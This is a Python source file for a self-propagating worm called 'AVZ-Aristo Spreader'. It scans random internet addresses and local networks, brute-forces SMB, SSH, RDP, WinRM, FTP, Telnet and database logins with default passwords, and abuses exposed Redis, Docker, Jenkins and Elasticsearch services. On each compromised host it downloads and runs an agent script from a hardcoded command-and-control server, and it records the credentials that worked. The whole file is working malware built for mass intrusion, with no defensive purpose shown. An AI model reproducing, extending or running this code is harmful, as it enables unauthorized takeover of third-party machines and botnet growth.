#!/usr/bin/env python3
# AVZ-Aristo Spreader v25.12 – кэш портов, ускоренный скан, цели из файла
import asyncio, aiohttp, random, socket, time, json, os, sys, argparse, ftplib, subprocess, ipaddress, logging, sqlite3, requests

if sys.platform != 'win32':
    import resource
    try:
        resource.setrlimit(resource.RLIMIT_NOFILE, (65535, 65535))
    except:
        pass

logging.getLogger("paramiko").setLevel(logging.CRITICAL)

C2_HOST = "80.249.146.202"
C2_PORT = 80
API_PORT = 8080
AGENT_URL = f"http://{C2_HOST}:{API_PORT}/agent_bash.sh"
MAX_CONCURRENT = 800
QUICK_TIMEOUT = 1.0
BRUTE_TIMEOUT = 2.0
DEFAULT_SCAN_COUNT = 20_000
PORT_LIST = [21, 22, 1433, 3306, 3389, 445, 5432, 5985, 6379, 8080, 9200]

CREDS = [
    ("root","root"), ("root","admin"), ("root","password"), ("root","123456"),
    ("admin","admin"), ("admin","password"), ("admin","123456"),
    ("sa",""), ("sa","sa"), ("sa","password"), ("sa","123456"),
    ("postgres","postgres"), ("postgres","password"), ("postgres","123456")
]

SUCCESS_CREDS_FILE = "success_creds.json"
SUCCESS_CREDS = []
if os.path.exists(SUCCESS_CREDS_FILE):
    with open(SUCCESS_CREDS_FILE) as f:
        SUCCESS_CREDS = json.load(f)

# Кэш открытых портов (SQLite)
DB_FILE = "ports_cache.db"
conn = sqlite3.connect(DB_FILE)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS ports (ip text, port integer, seen integer, PRIMARY KEY (ip, port))''')
conn.commit()

PORT_CACHE_TTL = 3600

def is_port_cached(ip, port):
    c.execute("SELECT seen FROM ports WHERE ip=? AND port=? AND seen > ?", (ip, port, time.time() - PORT_CACHE_TTL))
    return c.fetchone() is not None

def cache_port(ip, port):
    c.execute("INSERT OR REPLACE INTO ports VALUES (?, ?, ?)", (ip, port, int(time.time())))
    conn.commit()

TOP_RANGES = [
    "8.0.0.0/8", "13.0.0.0/8", "34.0.0.0/8", "35.0.0.0/8", "45.0.0.0/8",
    "52.0.0.0/8", "54.0.0.0/8", "64.0.0.0/8", "74.0.0.0/8", "104.0.0.0/8",
    "136.0.0.0/8", "142.0.0.0/8", "152.0.0.0/8", "172.0.0.0/8", "185.0.0.0/8"
]
GUARANTEED_IPS = [
    "45.33.32.156", "34.94.3.0", "45.77.165.0", "185.220.101.0", "23.226.229.0",
    "103.15.28.0", "185.225.19.0", "45.33.32.0", "45.56.89.0", "45.79.207.0",
    "34.94.0.0", "34.94.1.0", "45.33.32.1", "34.94.2.0", "45.77.165.1"
]

TARGET_COUNTRY = os.environ.get("SPREAD_COUNTRY", "").upper()

def get_country(ip):
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}", timeout=2)
        if resp.status_code == 200:
            data = resp.json()
            return data.get("countryCode", "")
    except:
        pass
    return ""

def is_country_allowed(ip):
    if not TARGET_COUNTRY:
        return True
    return get_country(ip) == TARGET_COUNTRY

def random_ip():
    while True:
        if random.random() < 0.5:
            base_ip = random.choice(GUARANTEED_IPS)
            parts = base_ip.split('.')
            parts[3] = str(random.randint(1, 254))
            ip = '.'.join(parts)
        elif random.random() < 0.7:
            r = random.choice(TOP_RANGES)
            net, mask = r.split("/")
            octets = list(map(int, net.split(".")))
            host = random.randint(0, (1 << (32 - int(mask))) - 1)
            for i in range(4):
                octets[i] |= (host >> (8*(3-i))) & 0xFF
            ip = ".".join(map(str, octets))
        else:
            a = random.randint(1, 223)
            b = random.randint(0, 255)
            c = random.randint(0, 255)
            d = random.randint(0, 255)
            if a == 10: continue
            if a == 127: continue
            if a == 172 and 16 <= b <= 31: continue
            if a == 192 and b == 168: continue
            if a == 169 and b == 254: continue
            if a >= 224: continue
            ip = f"{a}.{b}.{c}.{d}"
        if is_country_allowed(ip):
            return ip

async def probe_port(ip, port):
    if is_port_cached(ip, port):
        return True
    try:
        _, w = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=QUICK_TIMEOUT)
        w.close(); await w.wait_closed()
        cache_port(ip, port)
        return True
    except:
        return False

async def smb_brute(ip):
    if sys.platform != 'linux':
        return False
    for u, p in CREDS + SUCCESS_CREDS:
        cmd = f"python3 -m impacket.examples.psexec {u}:{p}@{ip} 'cmd.exe /c curl -s {AGENT_URL} | cmd'"
        try:
            proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL)
            await asyncio.wait_for(proc.communicate(), timeout=5)
            if proc.returncode == 0:
                save_success_creds(u, p)
                return True
        except:
            pass
    return False

async def winrm_brute(ip):
    try:
        import winrm
        for u, p in CREDS + SUCCESS_CREDS:
            try:
                session = winrm.Session(ip, auth=(u, p), transport='ntlm')
                result = session.run_ps(f"Invoke-WebRequest -Uri {AGENT_URL} -OutFile C:\\Windows\\Temp\\agent.ps1; C:\\Windows\\Temp\\agent.ps1")
                if result.status_code == 0:
                    save_success_creds(u, p)
                    return True
            except:
                continue
    except ImportError:
        pass
    return False

async def ssh_brute_ultra(ip):
    try:
        import asyncssh
        for u, p in (SUCCESS_CREDS + CREDS[:5]):
            try:
                async with asyncssh.connect(ip, username=u, password=p, known_hosts=None, connect_timeout=2) as conn:
                    await conn.run(f"wget -O- {AGENT_URL} | bash")
                    save_success_creds(u, p)
                    return True
            except:
                continue
    except ImportError:
        pass
    return False

async def rdp_brute(ip):
    if sys.platform != 'linux':
        return False
    for u, p in (SUCCESS_CREDS + CREDS[:5]):
        cmd = f"xfreerdp /v:{ip} /u:{u} /p:'{p}' /cert-ignore +auth-only /sec:nla"
        proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.DEVNULL, stderr=asyncio.subprocess.DEVNULL)
        try:
            await asyncio.wait_for(proc.communicate(), timeout=3)
            if proc.returncode == 0:
                await asyncio.create_subprocess_shell(f"xfreerdp /v:{ip} /u:{u} /p:'{p}' /cert-ignore /sec:nla +home-drive /cmd:'cmd.exe /c curl -s {AGENT_URL} | bash'")
                save_success_creds(u, p)
                return True
        except:
            pass
    return False

async def ftp_brute(ip):
    for u, p in (SUCCESS_CREDS + CREDS[:5]):
        try:
            ftp = ftplib.FTP()
            ftp.connect(ip, 21, timeout=BRUTE_TIMEOUT)
            ftp.login(u, p)
            with open("/tmp/agent.sh", "w") as f:
                f.write(f"wget -O- {AGENT_URL} | bash")
            with open("/tmp/agent.sh", "rb") as f:
                ftp.storbinary("STOR agent.sh", f)
            ftp.quit()
            save_success_creds(u, p)
            return True
        except:
            pass
    try:
        ftp = ftplib.FTP()
        ftp.connect(ip, 21, timeout=BRUTE_TIMEOUT)
        ftp.login()
        ftp.quit()
        return True
    except:
        pass
    return False

async def exploit_redis(ip):
    try:
        import redis
        r = redis.Redis(host=ip, port=6379, socket_timeout=2)
        r.ping()
        r.set('crackit', '\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ...\n\n')
        r.config_set('dir', '/root/.ssh')
        r.config_set('dbfilename', 'authorized_keys')
        r.save(); r.close()
        return True
    except Exception as e:
        pass
    return False

async def exploit_docker(ip):
    try:
        import docker
        client = docker.DockerClient(base_url=f'tcp://{ip}:2375', timeout=2)
        client.containers.run('alpine', f'wget -O- {AGENT_URL} | sh', detach=True)
        client.close()
        return True
    except Exception as e:
        pass
    return False

async def exploit_jenkins(ip):
    url = f'http://{ip}:8080/script'
    script = f'println "wget -O- {AGENT_URL} | sh".execute().text'
    try:
        async with aiohttp.ClientSession() as s:
            async with s.post(url, data={'script': script}, timeout=3) as resp:
                return resp.status == 200
    except:
        pass
    return False

async def exploit_telnet(ip):
    for u, p in (SUCCESS_CREDS + CREDS[:5]):
        try:
            reader, writer = await asyncio.wait_for(asyncio.open_connection(ip, 23), timeout=1.5)
            writer.write(u.encode() + b"\r\n")
            await writer.drain()
            await asyncio.sleep(0.2)
            writer.write(p.encode() + b"\r\n")
            await writer.drain()
            await asyncio.sleep(0.2)
            writer.write(f"wget -O- {AGENT_URL} | sh\r\n".encode())
            await writer.drain()
            await asyncio.sleep(0.3)
            writer.write(b"exit\r\n")
            await writer.drain()
            writer.close()
            save_success_creds(u, p)
            return True
        except:
            pass
    return False

async def exploit_elasticsearch(ip):
    payload = {"size":1, "script_fields": {"lol": {"script": f"java.lang.Runtime.getRuntime().exec('wget -O- {AGENT_URL} | sh')"}}}
    try:
        async with aiohttp.ClientSession() as s:
            async with s.post(f'http://{ip}:9200/_search', json=payload, timeout=2) as resp:
                return resp.status == 200
    except:
        pass
    return False

async def mysql_brute(ip):
    try:
        import mysql.connector
        for u, p in (SUCCESS_CREDS + CREDS):
            try:
                conn = mysql.connector.connect(host=ip, user=u, password=p, connect_timeout=3)
                cursor = conn.cursor()
                cursor.execute(f"SELECT sys_exec('wget -O- {AGENT_URL} | bash')")
                conn.close()
                save_success_creds(u, p)
                return True
            except:
                pass
    except ImportError:
        pass
    return False

async def mssql_brute(ip):
    try:
        import pymssql
        for u, p in (SUCCESS_CREDS + CREDS):
            try:
                conn = pymssql.connect(server=ip, user=u, password=p, login_timeout=3)
                cursor = conn.cursor()
                cursor.execute(f"EXEC xp_cmdshell 'curl -s {AGENT_URL} | cmd'")
                conn.close()
                save_success_creds(u, p)
                return True
            except:
                pass
    except ImportError:
        pass
    return False

async def postgresql_brute(ip):
    try:
        import psycopg2
        for u, p in (SUCCESS_CREDS + CREDS):
            try:
                conn = psycopg2.connect(host=ip, user=u, password=p, connect_timeout=3)
                cur = conn.cursor()
                cur.execute(f"COPY (SELECT 1) TO PROGRAM 'wget -O- {AGENT_URL} | bash'")
                conn.close()
                save_success_creds(u, p)
                return True
            except:
                pass
    except ImportError:
        pass
    return False

def save_success_creds(username, password):
    pair = [username, password]
    if pair not in SUCCESS_CREDS:
        SUCCESS_CREDS.append(pair)
        with open(SUCCESS_CREDS_FILE, "w") as f:
            json.dump(SUCCESS_CREDS, f)

async def infect(ip, port_stats):
    ports = PORT_LIST
    open_ports = await asyncio.gather(*[probe_port(ip, p) for p in ports])
    for i, p in enumerate(ports):
        if open_ports[i]:
            port_stats[p] = port_stats.get(p, 0) + 1
    if open_ports[5] and await smb_brute(ip):
        print(f"[INFECTED] {ip} via SMB", flush=True)
        return True
    if open_ports[1] and await ssh_brute_ultra(ip):
        print(f"[INFECTED] {ip} via SSH", flush=True)
        return True
    if open_ports[7] and await winrm_brute(ip):
        print(f"[INFECTED] {ip} via WinRM", flush=True)
        return True
    if open_ports[2] and await mssql_brute(ip):
        print(f"[INFECTED] {ip} via MSSQL", flush=True)
        return True
    if open_ports[3] and await mysql_brute(ip):
        print(f"[INFECTED] {ip} via MySQL", flush=True)
        return True
    if open_ports[6] and await postgresql_brute(ip):
        print(f"[INFECTED] {ip} via PostgreSQL", flush=True)
        return True
    if open_ports[4] and await rdp_brute(ip):
        print(f"[INFECTED] {ip} via RDP", flush=True)
        return True
    if open_ports[8] and await exploit_redis(ip):
        print(f"[INFECTED] {ip} via Redis", flush=True)
        return True
    if open_ports[9] and await exploit_jenkins(ip):
        print(f"[INFECTED] {ip} via Jenkins", flush=True)
        return True
    if open_ports[10] and await exploit_elasticsearch(ip):
        print(f"[INFECTED] {ip} via Elasticsearch", flush=True)
        return True
    if open_ports[0] and await ftp_brute(ip):
        print(f"[INFECTED] {ip} via FTP", flush=True)
        return True
    return False

async def worker(queue, stats, port_stats, progress_cb=None):
    while True:
        ip = await queue.get()
        try:
            if await infect(ip, port_stats):
                stats['success'] += 1
            else:
                stats['fail'] += 1
        except:
            stats['fail'] += 1
        if progress_cb:
            await progress_cb()
        queue.task_done()

async def scan_cycle(ips, progress_callback=None):
    q = asyncio.Queue()
    stats = {'success':0, 'fail':0}
    port_stats = {}
    count = len(ips)
    progress_count = 0

    async def progress_inner():
        nonlocal progress_count
        progress_count += 1
        if progress_count % 500 == 0 and progress_callback:
            await progress_callback(progress_count, count, stats, port_stats)

    for ip in ips:
        q.put_nowait(ip)
    tasks = [asyncio.create_task(worker(q, stats, port_stats, progress_inner)) for _ in range(MAX_CONCURRENT)]
    await q.join()
    for t in tasks:
        t.cancel()
    return stats, port_stats

async def global_scan(count, progress_callback=None):
    ips = [random_ip() for _ in range(count)]
    return await scan_cycle(ips, progress_callback)

async def local_scan(progress_callback=None):
    ips = get_local_ips()
    if not ips:
        return {'success':0, 'fail':0}, {}
    print(f"[*] Scanning local network, {len(ips)} hosts", flush=True)
    return await scan_cycle(ips, progress_callback)

def get_local_ips():
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
    except:
        return []
    network = ipaddress.IPv4Network(f"{local_ip}/24", strict=False)
    return [str(host) for host in network.hosts() if str(host) != local_ip]

async def main_async(args):
    print("[*] Checking C2 connection...", flush=True)
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((C2_HOST, C2_PORT))
        s.sendall(b"ping")
        s.recv(1024)
        s.close()
        print("[+] C2 reachable", flush=True)
    except Exception as e:
        print(f"[!] C2 unreachable: {e}", flush=True)

    targets = []
    if args.targets:
        if os.path.exists(args.targets):
            with open(args.targets) as f:
                targets = [line.strip() for line in f if line.strip()]
            print(f"[*] Loaded {len(targets)} targets from {args.targets}", flush=True)

    async def gui_progress(current, total, stats, port_stats):
        port_str = ", ".join(f"{p}: {c} open" for p, c in sorted(port_stats.items()))
        if port_str:
            print(f"[PROGRESS] {current}/{total} | Infected: {stats['success']} | Failed: {stats['fail']} | {port_str}", flush=True)
        else:
            print(f"[PROGRESS] {current}/{total} | Infected: {stats['success']} | Failed: {stats['fail']} | All ports closed", flush=True)

    if args.local:
        print("[*] Mode: local network", flush=True)
        while True:
            stats, port_stats = await local_scan(gui_progress)
            print(f"Cycle: +{stats['success']} infected, {stats['fail']} failed", flush=True)
            await asyncio.sleep(30)
    elif targets:
        print("[*] Mode: targets from file", flush=True)
        while True:
            stats, port_stats = await scan_cycle(targets, gui_progress)
            print(f"Cycle: +{stats['success']} infected, {stats['fail']} failed", flush=True)
            await asyncio.sleep(60)
    else:
        print(f"[*] Mode: global, {args.count} targets per cycle", flush=True)
        while True:
            stats, port_stats = await global_scan(args.count, gui_progress)
            print(f"Cycle: +{stats['success']} infected, {stats['fail']} failed", flush=True)
            await asyncio.sleep(30)

def main():
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group()
    group.add_argument('--count', type=int, default=DEFAULT_SCAN_COUNT)
    group.add_argument('--local', action='store_true')
    group.add_argument('--targets', type=str, help='Path to targets file')
    args = parser.parse_args()
    try:
        asyncio.run(main_async(args))
    except KeyboardInterrupt:
        print("\n[*] Spreader stopped", flush=True)

if __name__ == '__main__':
    main()
